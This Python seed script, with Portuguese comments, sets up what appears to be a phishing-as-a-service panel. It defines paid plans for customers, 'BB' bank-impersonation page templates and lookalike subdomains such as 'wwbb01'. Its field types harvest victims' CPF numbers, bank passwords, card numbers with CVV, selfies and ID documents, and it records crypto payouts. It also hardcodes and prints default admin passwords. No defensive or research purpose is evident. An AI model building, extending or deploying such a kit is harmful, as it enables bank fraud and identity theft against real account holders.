from datetime import datetime

from app import bcrypt, mongo
from app.templates_data import get_all_templates
from app.models.client_crypto_payout import ClientCryptoPayout


PLAN_DEFINITIONS = [
    {
        "name": "Startup",
        "slug": "startup",
        "description": "Plano inicial — perfeito para validar e começar rapidamente",
        "price": 1200.0,
        "duration_days": 15,
        "active_domains_limit": 2,
        "active_templates_limit": 1,
        "features": [
            "2 Subdomínios",
            "Acesso ao painel completo",
            "15 dias de uso",
            "Suporte via Email"
        ],
        "status": "active"
    },
    {
        "name": "Growth",
        "slug": "growth",
        "description": "Para operações em expansão — mais recursos e flexibilidade",
        "price": 2000.0,
        "duration_days": 30,
        "active_domains_limit": 4,
        "active_templates_limit": 3,
        "features": [
            "4 Subdomínios",
            "Dashboard de Analytics",
            "Templates adicionais",
            "Suporte prioritário"
        ],
        "status": "active"
    },
    {
        "name": "Enterprise",
        "slug": "enterprise",
        "description": "Solução completa para escalar sem limites",
        "price": 3000.0,
        "duration_days": 30,
        "active_domains_limit": -1,
        "active_templates_limit": -1,
        "features": [
            "Subdomínios ilimitados",
            "Domínio próprio incluído",
            "Acesso à API e integrações",
            "Suporte 24/7"
        ],
        "status": "active"
    }
]

DOMAIN_ID = None
CLIENT_IDS = {}

def initialize_db():
    print("\n" + "="*80)
    print("INICIANDO CONFIGURACAO DO BANCO DE DADOS")
    print("="*80 + "\n")
    
    if mongo.db.admins.count_documents({}) == 0:
        print("Criando administradores...")
        create_admins()
    else:
        print("Administradores ja existem")
    
    if mongo.db.plans.count_documents({}) == 0:
        print("Criando planos...")
        create_plans()
    else:
        print("Planos ja existem")
    
    if mongo.db.templates.count_documents({}) == 0:
        print("Criando templates BB...")
        create_templates()
    else:
        print("Templates ja existem")
    
    if mongo.db.field_types.count_documents({}) == 0:
        print("Criando tipos de campos...")
        create_field_types()
    else:
        print("Field types ja existem")
    
    if mongo.db.domains.count_documents({}) == 0:
        print("Criando dominio global...")
        create_domain()
    else:
        print("Dominio ja existe")
    
    if mongo.db.clients.count_documents({}) == 0:
        print("Criando clientes...")
        create_clients()
    else:
        print("Clientes ja existem")
        load_client_ids()
    
    if mongo.db.client_domains.count_documents({}) == 0:
        print("Criando subdominios...")
        create_client_domains()
    else:
        print("Subdominios ja existem")
    
    print("\n" + "="*80)
    print("BANCO DE DADOS CONFIGURADO COM SUCESSO!")
    print("="*80 + "\n")
    
    # Create indexes for crypto payouts
    print("Criando índices para client_crypto_payouts...")
    try:
        ClientCryptoPayout.create_indexes()
        print("  OK Índices criados")
    except Exception as e:
        print(f"  AVISO: Erro ao criar índices: {e}")
    
    print_summary()

def create_admins():
    admins = [
        {"username": "superadmin", "password": "Admin@123", "role": "super_admin"},
        {"username": "admin1", "password": "Admin@123", "role": "admin"},
        {"username": "admin2", "password": "Admin@123", "role": "admin"}
    ]
    for admin_data in admins:
        password = admin_data.pop("password")
        hashed_pw = bcrypt.generate_password_hash(password).decode("utf-8")
        admin = {**admin_data, "password": hashed_pw, "createdAt": datetime.utcnow(), "updatedAt": datetime.utcnow()}
        result = mongo.db.admins.insert_one(admin)
        print(f"  OK {admin_data['username']}")

def create_plans():
    for plan_definition in PLAN_DEFINITIONS:
        plan = {
            **plan_definition,
            "createdAt": datetime.utcnow(),
            "updatedAt": datetime.utcnow()
        }
        result = mongo.db.plans.insert_one(plan)
        print(f"  OK {plan_definition['name']}")

def create_templates():
    templates = get_all_templates()
    for template in templates:
        template["createdAt"] = datetime.utcnow()
        template["updatedAt"] = datetime.utcnow()
        result = mongo.db.templates.insert_one(template)
        print(f"  OK {template['name']} - {len(template['pages'])} paginas")

def create_field_types():
    field_types = [
        {"name": "CPF", "slug": "cpf", "description": "CPF", "fields": ["cpf"]},
        {"name": "CPF e Senha", "slug": "cpf_senha", "description": "Login", "fields": ["cpf", "senha"]},
        {"name": "Dados Bancarios", "slug": "dados_bancarios", "description": "Conta", "fields": ["agencia", "conta", "senha8"]},
        {"name": "Celular e Senha6", "slug": "celular_senha6", "description": "Mobile", "fields": ["celular", "senha6"]},
        {"name": "Cartao", "slug": "cartao", "description": "Cartao", "fields": ["numero_cartao", "validade", "cvv"]},
        {"name": "Selfie", "slug": "selfie", "description": "Selfie", "fields": ["selfie"]},
        {"name": "Documento", "slug": "documento", "description": "Documento", "fields": ["doc_frente", "doc_verso"]},
        {"name": "Sucesso", "slug": "sucesso", "description": "Final", "fields": []}
    ]
    for field_type in field_types:
        field_type["createdAt"] = datetime.utcnow()
        field_type["updatedAt"] = datetime.utcnow()
        result = mongo.db.field_types.insert_one(field_type)
        print(f"  OK {field_type['name']}")

def create_domain():
    global DOMAIN_ID
    domain = {"name": "localhost", "description": "Desenvolvimento local", "status": "active", "ssl_enabled": False, "createdAt": datetime.utcnow(), "updatedAt": datetime.utcnow()}
    result = mongo.db.domains.insert_one(domain)
    DOMAIN_ID = result.inserted_id
    print(f"  OK {domain['name']}")

def create_clients():
    global CLIENT_IDS
    plan_startup = mongo.db.plans.find_one({"name": "Startup"})
    plan_growth = mongo.db.plans.find_one({"name": "Growth"})
    plan_enterprise = mongo.db.plans.find_one({"name": "Enterprise"})

    if not all([plan_startup, plan_growth, plan_enterprise]):
        print("  Erro: Não foi possível localizar todos os planos padrão para criar clientes.")
        return

    clients = [
        {"username": "cliente1", "password": "Senha@123", "email": "cliente1@example.com", "name": "Cliente Enterprise", "plan_id": plan_enterprise["_id"], "status": "active"},
        {"username": "cliente2", "password": "Senha@123", "email": "cliente2@example.com", "name": "Cliente Growth", "plan_id": plan_growth["_id"], "status": "active"},
        {"username": "cliente3", "password": "Senha@123", "email": "cliente3@example.com", "name": "Cliente Startup", "plan_id": plan_startup["_id"], "status": "active"}
    ]

    CLIENT_IDS = {}
    for client_data in clients:
        password = client_data.pop("password")
        hashed_pw = bcrypt.generate_password_hash(password).decode("utf-8")
        plan = mongo.db.plans.find_one({"_id": client_data["plan_id"]})
        client = {**client_data, "password": hashed_pw, "createdAt": datetime.utcnow(), "updatedAt": datetime.utcnow()}
        result = mongo.db.clients.insert_one(client)
        CLIENT_IDS[client_data["username"]] = result.inserted_id
        print(f"  OK {client_data['username']} - {plan['name']}")

def load_client_ids():
    """Carrega IDs dos clientes existentes no banco"""
    global CLIENT_IDS
    CLIENT_IDS = {}
    for client in mongo.db.clients.find():
        CLIENT_IDS[client["username"]] = client["_id"]

def create_client_domains():
    template_completo = mongo.db.templates.find_one({"slug": "bb_fluxo_completo"})
    if not template_completo:
        print("  Aviso: Template 'bb_fluxo_completo' não encontrado. Pulando criação de subdomínios de exemplo.")
        return

    domain = mongo.db.domains.find_one({"name": "localhost"})
    if not domain:
        print("  Aviso: Domínio padrão 'localhost' não encontrado. Pulando criação de subdomínios de exemplo.")
        return

    desired_clients = [
        ("cliente1", "wwbb01", "Cliente 1 - BB Completo"),
        ("cliente2", "wwbb02", "Cliente 2 - BB Completo"),
        ("cliente3", "wwbb03", "Cliente 3 - BB Completo"),
    ]

    missing_clients = [username for username, _, _ in desired_clients if username not in CLIENT_IDS]
    if missing_clients:
        lista = ", ".join(missing_clients)
        print(f"  Aviso: Clientes padrão não encontrados ({lista}). Pulando criação de subdomínios de exemplo.")
        return

    client_domains = []
    for username, subdomain, description in desired_clients:
        client_domains.append(
            {
                "subdomain": subdomain,
                "full_domain": f"{subdomain}.localhost",
                "client_id": CLIENT_IDS[username],
                "domain_id": domain["_id"],
                "template_id": template_completo["_id"],
                "status": "active",
                "description": description,
            }
        )

    for cd in client_domains:
        cd["createdAt"] = datetime.utcnow()
        cd["updatedAt"] = datetime.utcnow()
        mongo.db.client_domains.insert_one(cd)
        print(f"  OK {cd['full_domain']} -> {template_completo['name']}")

def print_summary():
    print("RESUMO:\n")
    print(f"  Admins: {mongo.db.admins.count_documents({})}")
    print(f"  Planos: {mongo.db.plans.count_documents({})}")
    print(f"  Templates: {mongo.db.templates.count_documents({})}")
    print(f"  Dominios: {mongo.db.domains.count_documents({})}")
    print(f"  Clientes: {mongo.db.clients.count_documents({})}")
    print(f"  Subdominios: {mongo.db.client_domains.count_documents({})}")
    print("\nCREDENCIAIS:\n  superadmin / Admin@123\n  cliente1 / Senha@123\n")
    print("SUBDOMINIOS ATIVOS:\n")
    for cd in mongo.db.client_domains.find():
        template = mongo.db.templates.find_one({"_id": cd["template_id"]})
        print(f"  http://{cd['full_domain']}:5001/ -> {template['name']}")
    print()
